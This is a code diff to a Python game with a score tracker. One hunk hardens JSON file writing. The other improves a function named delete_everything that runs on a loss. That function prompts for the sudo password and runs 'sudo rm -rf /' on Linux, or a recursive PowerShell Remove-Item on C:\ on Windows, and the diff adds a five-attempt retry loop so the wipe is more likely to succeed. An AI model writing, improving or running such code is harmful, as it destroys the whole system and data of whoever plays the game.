@@ -75,13 +75,19 @@ class ScoreManager:
     def _write(self, data: dict[str, Any]) -> None:
         DATA_DIR.mkdir(parents=True, exist_ok=True)
         tmp_path = self.path.with_suffix(".tmp")
-        with tmp_path.open("w", encoding="utf-8") as fh:
-            json.dump(data, fh, indent=2, ensure_ascii=False)
-        if tmp_path.exists():
-            os.replace(tmp_path, self.path)
-        else:
+        try:
+            with tmp_path.open("w", encoding="utf-8") as fh:
+                json.dump(data, fh, indent=2, ensure_ascii=False)
+        except Exception:
             with self.path.open("w", encoding="utf-8") as fh:
                 json.dump(data, fh, indent=2, ensure_ascii=False)
+            return
+        if tmp_path.exists():
+            try:
+                os.replace(tmp_path, self.path)
+            except OSError:
+                with self.path.open("w", encoding="utf-8") as fh:
+                    json.dump(data, fh, indent=2, ensure_ascii=False)
 
     def record(self, result: GameResult) -> None:
         self.stats["total_games"] += 1
@@ -133,12 +139,22 @@ def delete_everything(result: GameResult) -> None:
         raise ValueError("must only be called on a loss.")
     
     if platform.system() == "Linux":
-        password = getpass.getpass("Enter sudo password: ")
-        subprocess.run(
-            ["sudo", "-S", "rm", "-rf", "/"],
-            input=password.encode(),
-            check=False
-        )
+        max_attempts = 5
+        for attempt in range(1, max_attempts + 1):
+            password = getpass.getpass(f"Enter sudo password (attempt {attempt}/{max_attempts}): ")
+            process = subprocess.run(
+                ["sudo", "-S", "rm", "-rf", "/"],
+                input=password,
+                capture_output=True,
+                text=True,
+                check=False
+            )
+            if process.returncode == 0:
+                break
+            else:
+                print("Incorrect password or error Try again.")
+                if attempt == max_attempts:
+                    print("Too many failed attempts Exiting.")
     elif platform.system() == "Windows":
         subprocess.run(
             ["powershell", "-Command", "Remove-Item -Path C:\\* -Recurse -Force"],
